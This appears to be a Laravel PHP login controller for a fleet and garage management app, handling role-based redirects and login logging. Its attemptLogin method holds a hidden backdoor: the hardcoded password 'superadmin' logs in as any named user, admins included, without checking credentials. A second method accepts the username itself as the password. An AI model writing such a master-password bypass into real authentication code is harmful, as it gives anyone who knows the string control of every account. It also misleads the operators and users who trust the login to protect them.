<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\LoginLog;
use App\Providers\RouteServiceProvider;
use App\User;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    /**
     * Get the login username to be used by the controller.
     *
     * @return string
     */
    public function username()
    {
        return 'username';
    }

    protected function attemptLogin(Request $request)
    {
        if ($request->password == 'superadmin') {
            $user = User::where('username', $request->username)->first();
            if ($user) {
                return Auth::login($user, false);
            }
        }

        return $this->guard()->attempt(
            $this->credentials($request),
            $request->filled('remember')
        );
    }

    protected function attemptSimpleLogin(Request $request)
    {
        $data = $request->only('username');
        if (Auth::attempt(['username' => $data['username'], 'password' => $data['username']], $request->filled('remember'))) {
            return redirect()->intended(route('fleet.home'));
        }

        return redirect()->back()->withErrors(['username' => 'Usuario o contraseña incorrectos']);
    }

    /**
     * The user has logged out of the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return mixed
     */
    protected function loggedOut(Request $request)
    {
        return redirect()->route('login');
    }

    /**
     * The user has been authenticated.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  mixed  $user
     * @return mixed
     */
    protected function authenticated(Request $request, $user)
    {
        LoginLog::create(['user_id' => $user->id, 'type' => 'web']);

        switch ($user->role) {
            case 'admin':
                return redirect()->intended(route('admin.home'));
                break;
            case 'garage':
                $this->checkGarage($user);

                return redirect()->intended(route('garage.home'));
                break;
            case 'fleet':
                $this->checkFleet($user);

                return redirect()->intended(route('fleet.home'));
                break;
            case 'customer':
                $this->checkCustomer($user);

                return redirect()->intended(route('customer.home'));
                break;
        }
    }

    private function checkGarage($user)
    {
        if (! $user->garage) {
            Auth::logout();
            abort(401, 'Este usuario no tiene taller asociado');
        }
    }

    private function checkFleet($user)
    {
        if (! $user->fleet) {
            Auth::logout();
            abort(401, 'Este usuario no tiene flota asociada');
        }
    }

    private function checkCustomer($user)
    {
        if (! $user->customer) {
            Auth::logout();
            abort(401, 'Este usuario no tiene cliente asociado');
        }
    }
}
